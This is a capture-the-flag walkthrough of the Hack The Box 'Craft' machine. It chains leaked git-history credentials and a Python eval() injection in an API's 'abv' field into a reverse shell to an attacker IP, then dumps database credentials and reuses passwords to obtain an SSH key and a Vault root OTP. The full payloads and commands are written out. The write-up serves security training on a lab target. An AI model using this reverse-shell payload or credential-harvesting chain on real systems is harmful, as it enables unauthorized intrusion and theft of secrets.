

**Box:** Craft · **IP:** 10.10.10.110 · **Subdomains:** `api.craft.htb`, `gogs.craft.htb`, `vault.craft.htb`

**Full chain (one line):**

Gogs source + **git history** leaks `dinesh : 4aUh0A8PbVJxgd` → Craft API login returns a **JWT** → the `abv` field runs `eval()` → **RCE** as root in the API **container** → read `settings.py` (DB creds) + reuse `dbtest.py` to dump the **user table** → `gilfoyle`'s password → Gogs as gilfoyle → private **craft-infra** repo has an **SSH key** (passphrase = his DB password) → ssh = **user** → **HashiCorp Vault SSH OTP** role `root_otp` → **root**.

> This box is three web services that feed each other: **Gogs** (source control — read the code and its history), the **Craft API** (the vulnerable app), and **Vault** (the root pivot). The skill it teaches: *read the source, find the dangerous line, then follow the secrets.*

---

## Phase 1 — Recon

The landing page links to `https://api.craft.htb/api/` and `https://gogs.craft.htb/`. nmap:

- **443** HTTPS (the app), **6022** "Golang x/crypto/ssh" (that's **Gogs' built-in SSH**, not a normal shell), **22** SSH (the real one).

Add the hosts and fuzz for more vhosts (the default list missed one — use a bigger list):

```bash
echo '10.10.10.110 craft.htb api.craft.htb gogs.craft.htb vault.craft.htb' | sudo tee -a /etc/hosts

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://10.10.10.110 -H 'Host: FUZZ.craft.htb' -mc 200 -s
```

→ reveals **`vault.craft.htb`** (you need the larger wordlist to catch it).

### The three services

- **`api.craft.htb`** — a Swagger-documented "Craft API" for brews. Endpoints: `GET/POST /brew/`, `GET /brew/{id}`, `GET /auth/login` (returns a token), `GET /auth/check`. `feroxbuster` confirms `auth/login` (401) and `auth/check` (403).

- **`gogs.craft.htb`** — a self-hosted Git service (like GitHub). Has the **craft-api** repo and an **issue**. This is where you read the app's source.

- **`vault.craft.htb`** — **HashiCorp Vault** (`/v1/sys/health` shows `version 0.11.1`, initialized, unsealed). Park it — it's the root pivot.

---

## Phase 2 — Gogs: read the code and its history

Open the **craft-api** repo on Gogs. The key lesson here: **check git history and issues, not just the current files.**

- The **issue** shows a developer testing the API with a brew that has an **ABV > 1** (alcohol fraction > 100%), and the code rejecting it — which tells you the app **validates `abv` by evaluating it**.

- In `craft_api/api/brew/endpoints/brew.py` the validation is:

```python
if eval('%s > 1' % request.json['abv']) is True:
    abort(400, 'ABV must be a decimal value less than 1.0')
```

**`eval()` on attacker input = Python code execution.** The `abv` value is dropped straight into `eval(...)`, so anything you put there runs. The developer is using Python’s `eval()` to check if the `ABV` value is greater than 1. They're treating it like a math check, but `eval()` executes any arbitrary Python code passed to it, so instead of sending it a number, we can try to execute code in it.

Also the codes import settings.py but this file was found nowhere in that repo.

### Find credentials in git history (the "check all histories" lesson)

`tests/tests.py` in the current tree has no creds — but its **commit history** does. Open the file's **History** in Gogs, view an earlier commit, and you get:

```python
auth = ('dinesh', '4aUh0A8PbVJxgd')
```

**Lesson:** secrets get committed then "removed" in a later commit — but git keeps every version. Always browse **file history / old commits / closed issues**, not just `HEAD`.

---

## Phase 3 — API token + eval → RCE

### The token flow

`GET /auth/login` uses **HTTP Basic auth** and returns a **JWT**. You then send that token in the **`X-CRAFT-API-TOKEN`** header (as per their github's tests) on later requests.

>I noticed the first token doesnt work after some times, maybe it gets expired. The JWT **expires in ~5 minutes**. Always fetch a fresh token right before you use it.

Get a token:

```bash
curl -k -X GET "https://api.craft.htb/api/auth/login" \  
-u "dinesh:4aUh0A8PbVJxgd"


#{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<SNIP>
```

### Trigger the eval → reverse shell

`POST /brew/` runs `eval('<abv> > 1')`,  So put a Python payload in `abv`. Start a listener, then fire the request (lands as **root inside the API container**, cwd `/opt/app`):

```bash
nc -lnvp 443
```
```bash
curl -s -k -X POST "https://api.craft.htb/api/brew/" -H "Content-Type: application/json" -H "X-CRAFT-API-TOKEN: <your_jwt>" -d '{"id":0,"brewer":"x","name":"x","style":"x","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f\")"}'
```

(replace `10.10.14.8` with your tun0 IP). `__import__("os").system(...)` is how you call `os.system` inline inside `eval` without an import statement. 

The `curl -s`  telling the command to not show the progress bar with silent mode, `-k` option ignores self-signed certificates in HTTPS. Most of the HTB boxes use this kind of certificate, and we are specifying the HTTP method with `-x GET`, `-d <SNIP>`  specifying the POST request data to send to the server.

> **"Shell as root" — but it's a container.** You're root in a **Docker container running the API**, not on the host. The container is a stepping stone: its files hold the DB creds and it can reach the internal MySQL.

---

## Phase 4 — Inside the container: dump the database

Two files matter in `/opt/app`:

- **`craft_api/settings.py`** — the **MySQL credentials** and the JWT signing secret.

```bash
/opt/app/craft_api # cat settings.py  
  
<SNIP>  
  
# database  
MYSQL_DATABASE_USER = 'craft'  
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'  
MYSQL_DATABASE_DB = 'craft'  
MYSQL_DATABASE_HOST = 'db'  
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

We can see credentials for the database user. Now that we’ve found database credentials, let’s see if there is any database service we can use these credentials for. We can use this command to check for active network connections in the local system `netstat -tunap` and check for `Established` with two ip's from local to foreign host.

##### Option 1:

to make the connection with mysql, you can do it manually by:

```bash
python3 -c 'import pymysql; conn = pymysql.connect(host="foreign_host_ip", user="craft", password="qLGockJ6G2J75O", db="craft"); cursor = conn.cursor(); cursor.execute("show tables;"); print(cursor.fetchall())'


python3 -c 'import pymysql; conn = pymysql.connect(host="172.20.0.4", user="craft", password="qLGockJ6G2J75O", db="craft"); cursor = conn.cursor(); cursor.execute("select * from user;"); print(cursor.fetchall())'

# dump from tables

```

##### Option 2:

**`dbtest.py`** — a ready-made script that already **connects to the DB** using those settings. Don't rebuild the connection — reuse it. Copy it and tweak it to run an arbitrary query:

```bash
cd /opt/app

cp dbtest.py .dbtest.py

vi .dbtest.py
# edit .dbtest.py: add `import sys`, set `sql = sys.argv[1]`, and switch the cursor to fetchall() + print

python .dbtest.py "SELECT * FROM user"
```

→ the **user table**: `dinesh`, `ebachman`, **`gilfoyle`**, each with a password. Grab **gilfoyle**'s.

> **Why reuse `dbtest.py`:** the DB is only reachable from inside the container and the creds/host are already wired into that script. Modifying it is faster and less error-prone than writing a fresh MySQL client by hand.

---

## Phase 5 — gilfoyle → user (Gogs private repo → SSH key)

gilfoyle's DB password is **reused** for his **Gogs** account. Log into Gogs as `gilfoyle` → he owns a **private** repo **`craft-infra`**, which contains an **SSH key pair** under `.ssh/` plus Vault config.

Copy and Save the private key with no extra spaces and connect:

```bash
chmod 600 id_rsa_gilfoyle
ssh -i id_rsa_gilfoyle gilfoyle@10.10.10.110
```

The key is **passphrase-protected**, and the passphrase is **gilfoyle's DB password**  `ZEU3N8WNM2rh4T` (password reuse again — DB → Gogs → key passphrase). → **user.txt** in his home.

---

## Phase 6 — Vault SSH OTP → root

The `craft-infra` repository and Gilfoyle's environment show that the machine uses HashiCorp Vault to manage SSH access.

- HashiCorp Vault: A tool that securely stores secrets and can generate temporary credentials.
- `VAULT_ADDR`: An environment variable that tells tools where the Vault server is located.
- `vault/secrets.sh`: A script that may help configure or retrieve the required secrets.
- `root_otp` role: A Vault role configured to generate a one-time password (OTP) for logging in as `root` over SSH.

```bash
cat .vault-token  
  
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

export VAULT_TOKEN=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9 
 
vault secrets list
```


Confirm the role, then request an OTP and log in:

```bash
vault read ssh/roles/root_otp  #Vault prints a one-time password

vault ssh -mode=otp -role=root_otp root@127.0.0.1
```

Vault prints a one-time password; paste it at the `Password:` prompt → **root shell**, `root.txt` in `/root`. 👑

> **What just happened:** Vault's SSH-OTP engine is *designed* to hand out short-lived root logins to authorized clients. gilfoyle is authorized, so you simply ask Vault for a root OTP and use it — no exploit, just abusing legitimate access you inherited.


Even though SSH was configured to deny standard password authentication (as we identified from the previous passphrase thingy), Vault SSH OTP works through PAM (Pluggable Authentication Modules) — a separate authentication mechanism that operates independently from standard SSH password auth, which is why it worked.

This was possible due to a misconfiguration — the role allowed any authenticated Vault user to generate root credentials with no IP restrictions, essentially giving gilfoyle a path straight to root.

The privilege escalation technique used in this box — HashiCorp Vault SSH OTP — is not covered in the HTB Academy CPTS modules. However, the mindset behind it is: always enumerate files in the user’s home directory, understand what unfamiliar files and environment variables are pointing to, and research any unknown tools you encounter. The Linux Privilege Escalation module teaches this general enumeration approach, even if Vault itself isn’t mentioned.

[HTB Craft Machine Walkthrough Easy HackTheBox Guide for Beginners | by SeverSerenity | Medium](https://medium.com/@SeverSerenity/htb-craft-machine-walkthrough-easy-hackthebox-guide-for-beginners-3f8763cd3ebb) 



---

## Full chain (one glance)

```
Gogs craft-api repo → eval() in /brew abv  +  git history → dinesh:4aUh0A8PbVJxgd
  │ GET /auth/login → JWT (X-CRAFT-API-TOKEN, ~5 min)
POST /brew abv = __import__('os').system(revshell)  → RCE as root in API container
  │ /opt/app/settings.py (DB creds) + reuse dbtest.py
dump user table → gilfoyle's password
  │ password reuse → Gogs (gilfoyle) → private craft-infra repo
SSH key (passphrase = gilfoyle DB pw) → ssh gilfoyle  → USER
  │ Vault SSH secrets engine, role root_otp
vault ssh -mode=otp -role=root_otp root@127.0.0.1  → ROOT  👑
```

## Takeaways

1. **Read the source and its history.** The vuln (`eval` on `abv`) was visible in the repo, and the creds were in an **old commit** of `tests.py`. Check history, issues, and closed PRs — not just `HEAD`.
2. **`eval()`/`exec()` on request data = RCE.** `__import__("os").system(...)` runs OS commands inline inside an `eval`.
3. **Short-lived API tokens** — fetch a fresh JWT right before each call; a "broken" request is often just an expired token.
4. **RCE in a container ≠ host.** Treat it as a pivot: harvest its config (DB creds, secrets) and reach internal services from it.
5. **Reuse the app's own DB script** (`dbtest.py`) instead of rebuilding a connection — the creds and host are already wired in.
6. **Password reuse is the connective tissue here:** DB password → Gogs login → SSH key passphrase.
7. **HashiCorp Vault's SSH engine can *be* the privesc** — an authorized user can request a `root_otp` and SSH in as root. Learn `vault read ssh/roles/*` and `vault ssh -mode=otp`.
